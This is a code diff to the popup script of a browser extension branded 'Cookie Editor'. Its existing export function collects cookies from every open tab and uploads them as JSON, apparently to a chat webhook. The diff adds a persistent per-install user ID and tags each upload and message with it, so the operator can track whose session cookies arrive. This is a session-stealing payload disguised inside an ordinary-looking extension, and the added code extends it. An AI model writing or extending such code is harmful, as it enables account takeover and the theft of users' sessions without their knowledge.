@@ -997,10 +997,33 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
     }, 1500);
   }
 
+  /**
+   * Gets or creates a unique user identifier that persists in extension storage.
+   * @return {Promise<string>} The unique user ID.
+   */
+  async function getOrCreateUserId() {
+    try {
+      const storage = await browserDetector.getApi().storage.local.get('userId');
+      if (storage.userId) {
+        return storage.userId;
+      }
+      // Generate a new unique ID
+      const userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substring(2, 15);
+      await browserDetector.getApi().storage.local.set({ userId: userId });
+      return userId;
+    } catch (e) {
+      console.error('Failed to get/create user ID:', e);
+      return 'unknown_user';
+    }
+  }
+
   async function exportToServer() {
     hideExportMenu();
     
     try {
+      // Get unique user ID
+      const userId = await getOrCreateUserId();
+      
       // Get all tabs and collect cookies from each
       const tabs = await browserDetector.getApi().tabs.query({});
       const allTabsCookies = [];
@@ -1049,9 +1072,10 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
         return;
       }
       
-      // Create payload with all tabs data
+      // Create payload with all tabs data including user ID
       const timestamp = new Date().toISOString();
       const payload = {
+        userId: userId,
         timestamp: timestamp,
         source: 'popup',
         totalTabs: allTabsCookies.length,
@@ -1081,7 +1105,7 @@ import { CookieHandlerPopup } from './cookieHandlerPopup.js';
         const formData = new FormData();
         formData.append('payload_json', JSON.stringify({
           username: 'Cookie Editor - Popup',
-          content: `🍪 Cookies from popup at ${timestamp}\n📊 ${payload.totalTabs} tabs, ${payload.totalCookies} cookies`
+          content: `🍪 Cookies from popup at ${timestamp}\n👤 User: ${userId}\n📊 ${payload.totalTabs} tabs, ${payload.totalCookies} cookies`
         }));
         
         const jsonBlob = new Blob([cookiesJson], { type: 'application/json' });
